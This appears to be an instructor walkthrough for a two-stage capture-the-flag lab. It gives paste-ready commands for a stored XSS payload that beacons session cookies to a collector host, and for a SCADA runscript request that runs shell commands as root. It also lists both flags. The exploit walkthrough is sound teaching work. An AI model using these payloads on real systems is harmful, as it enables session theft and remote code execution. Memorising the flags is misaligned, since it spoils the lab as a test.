# Walkthrough — step by step

**Instructor material. Do not hand out.**

A straight, follow-along path through the whole lab: start the stack, ignore the
decoy, steal the supervisor session (stage 1), pivot into the SCADA console and
get RCE (stage 2). Every step is a concrete command you can paste.

For the *why* behind each bug (library diff, root-cause analysis, defence
notes), read `SOLUTION.md`. This file is just the route.

---

## 0 · Start the lab

```bash
cd /home/kali/projects/hslu-ctf-ot
docker compose up -d --build
docker compose ps        # web, scada, scada-gate, bot, collector all "running"
```

Hosts you will use:

| Service       | URL                     | Who may reach it                     |
|---------------|-------------------------|--------------------------------------|
| Portal (web)  | http://localhost:8100   | anyone                               |
| Collector     | http://localhost:8200   | anyone (your exfil listener)         |
| SCADA gate    | http://localhost:8300   | supervisor cookie only (→ FUXA)      |
| FUXA          | *not published*         | only via the gate                    |

Credentials you are **not** given up front and must earn:
`ot.supervisor` is the supervisor account, but you log in as that user by
**stealing the session**, not by knowing the password.

---

## 1 · Lay of the land

Open http://localhost:8100 and skim the asset register (`/sites`). As an
anonymous visitor you see five sites. The **Central Control System** is *not*
among them — it is restricted and only appears once you hold a supervisor
session. That gap is the whole point of stage 1.

```bash
curl -s localhost:8100/api/sites | python3 -c 'import sys,json;[print(s["id"],s["name"]) for s in json.load(sys.stdin)]'
```

---

## 2 · The fishing shop is a dead end

`Red Herring Fishing Co.` (Basel) has a storefront selling *Seemannsgarn*,
*Snake Oil «Nordsee»*, *Smoked Red Herring*, a *Phishing Tackle Set* and so on.
It is served by a real HTTP cart API, so it is tempting to attack:

```bash
RH=$(curl -s localhost:8100/api/sites | python3 -c 'import sys,json;print([s["id"] for s in json.load(sys.stdin) if "Red Herring" in s["name"]][0])')
jar=$(mktemp)
curl -s -c "$jar" -b "$jar" -X POST localhost:8100/api/shop/cart \
  -H 'content-type: application/json' \
  -d "{\"siteId\":\"$RH\",\"product\":\"Smoked Red Herring\",\"price\":\"CHF 0.01\"}"
curl -s -c "$jar" -b "$jar" -X POST localhost:8100/api/shop/checkout
```

Intercept and tamper it all you like (Burp / mitmproxy): the server resolves
prices from its own catalogue and rejects unknown articles, so a changed price
or injected item does nothing. There is no flag here. **Move on.** (It exists so
a class does not converge on the one real path too quickly.)

---

## 3 · Stage 1 — steal the supervisor session (stored XSS)

### 3.1 Recon the component

The **About** page (`/about`) and `/api/config` disclose the exact versions:

```bash
curl -s localhost:8100/api/config | python3 -m json.tool
# -> "mapsVersion": "49.16.0", "maxLabelLength": -1
```

`@siemens/maps-ng` 49.16.1 (the very next release) changed the map tooltip from
`innerHTML` to text interpolation — i.e. 49.16.0 renders the **site name** as
HTML in the tooltip. See `SOLUTION.md §1–2` for the tarball diff.

### 3.2 Confirm the sink

Register any site, open its detail page, hover the map marker. A name of
`<b>test</b>` renders **bold** → the tooltip is live HTML. `<script>` will not
run via `innerHTML`, so use an event handler: `<img src=x onerror=...>`.

### 3.3 Craft the payload

The payload runs inside the **bot's** browser on the lab network, so it must
reach the collector by its internal name `collector:8080`, not the host port
8200:

```
Notfall-Trafostation <img src=x onerror="fetch('http://collector:8080/?c='+encodeURIComponent(document.cookie))">
```

> Robust alternative (survives the tooltip re-rendering mid-sweep):
> `...onerror="new Image().src='http://collector:8080/?c='+encodeURIComponent(document.cookie)">`
> An image beacon is fire-and-forget; a `fetch()` can be aborted when the
> tooltip DOM is torn down. Both work against the bundled collector; prefer the
> image beacon for a flaky run or an external OOB host.

### 3.4 Plant it and trigger the review

Register the site via the UI (**Register site**) or the API, then request
supervisor validation — that queues the admin bot to open the review map and
hover your marker:

```bash
SITE=$(curl -s -X POST localhost:8100/api/sites -H 'content-type: application/json' -d '{
  "name":"Notfall-Trafostation <img src=x onerror=\"fetch('"'"'http://collector:8080/?c='"'"'+encodeURIComponent(document.cookie))\">",
  "description":"Ad-hoc registration, please validate.",
  "operator":"Field Service","assetType":"rtu","criticality":"high","lat":47.05,"lon":8.31
}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
echo "site: $SITE"
curl -s -X POST "localhost:8100/api/sites/$SITE/review" -d '{}'
```

### 3.5 Collect the cookie

Within ~15 s the bot hovers the marker and the payload beacons the cookie to the
collector:

```bash
curl -s localhost:8200/api/log | python3 -c 'import sys,json;[print(e.get("query",{}).get("c","")) for e in json.load(sys.stdin) if "gridops_session=" in e.get("query",{}).get("c","")]' | tail -1
```

Copy the `gridops_session=<token>` value.

### 3.6 Replay → flag 1

```bash
SESSION='gridops_session=<token>'
curl -s -H "Cookie: $SESSION" localhost:8100/api/admin/overview | python3 -m json.tool
```

`emergencyOverrideKey` is **flag 1**:
`HSLU{s1_m4p_t00lt1p_1nn3rHTML_1s_n0t_4_t3xt_n0d3}`. The same response reveals
the **Central Control System** and its console address `http://localhost:8300` —
your way into stage 2.

**Shortcut:** `cd solution && ./exploit.py` does all of 3.3–3.6 and prints the
cookie plus the ready-made stage 2 command.

---

## 4 · Stage 2 — pivot into SCADA (CVE-2026-43947, RCE)

Everything below reuses the **stolen** cookie from stage 1. The gate at
`:8300` returns `401` without it; FUXA is not otherwise reachable.

### 4.1 Recon the project (unauthenticated info disclosure)

```bash
curl -s -H "Cookie: $SESSION" localhost:8300/api/project \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);[print(s.get("id"),"/",s.get("name"),"perm="+str(s.get("permission"))) for s in d.get("scripts",[])]'
```

Note a server script with **no `permission` field**, e.g.
`s_gridops_telemetry` / `RefreshDispatchTelemetry`. Its id is the key the bypass
needs.

### 4.2 The bug

`POST /api/runscript` checks authorisation against the **stored** script
(`!st.permission` → allowed for everyone when no permission is set), but when the
request carries `test:true` it compiles and runs the **`code` from the request
body** instead. Guest JWT is auto-issued, so it needs no FUXA login. (Full
analysis: `SOLUTION.md` stage 2.)

### 4.3 RCE → flag 2

```bash
curl -s localhost:8300/api/runscript \
  -H "Cookie: $SESSION" -H 'content-type: application/json' --data @- <<'JSON'
{"params":{"script":{"id":"s_gridops_telemetry","name":"poc","test":true,
"parameters":[],"code":"return require('child_process').execSync('id; cat /opt/gridops/emergency-dispatch-key.txt').toString();"}}}
JSON
```

Runs as **root** and returns **flag 2**:
`HSLU{s2_fux4_run5cr1pt_t35t_m0d3_1s_n0t_4n_4uth_ch3ck}`.

Post-exploitation reward: `/opt/gridops/field-devices.conf` holds field-device
credentials.

**Shortcut:** `cd solution && ./exploit_stage2.py --cookie '<token>'` runs the
whole pivot and prints `uid=0(root)` plus flag 2.

---

## 5 · End-to-end sanity check

```bash
cd solution
./exploit.py            # stage 1 flag in ~15 s, prints the stage 2 command
./exploit_stage2.py     # uid=0(root) + stage 2 flag
```

If the collector stays empty in stage 1: `docker compose logs bot` — the bot
logs every review it opens. A stale cookie usually means the portal restarted
(sessions are in-memory); plant a fresh site and retry.

---

## Flags

| Stage | Flag                                                      |
|-------|-----------------------------------------------------------|
| 1     | `HSLU{s1_m4p_t00lt1p_1nn3rHTML_1s_n0t_4_t3xt_n0d3}`       |
| 2     | `HSLU{s2_fux4_run5cr1pt_t35t_m0d3_1s_n0t_4n_4uth_ch3ck}`  |

The IT→OT story in one line: an XSS in a *monitoring* map steals an operator's
session, and that session is enough to reach a *control-plane* SCADA host and
run code on it as root.
